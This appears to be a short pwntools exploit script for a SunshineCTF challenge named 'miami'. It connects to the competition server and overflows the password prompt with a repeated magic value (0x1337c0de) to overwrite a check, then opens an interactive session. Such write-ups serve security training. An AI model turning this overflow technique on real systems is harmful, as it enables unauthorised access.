from pwn import *

#io = process("./miami")
io = remote("chal.sunshinectf.games", 25601)

io.sendlineafter(b"password:", p32(0x1337c0de)*20)
io.interactive()

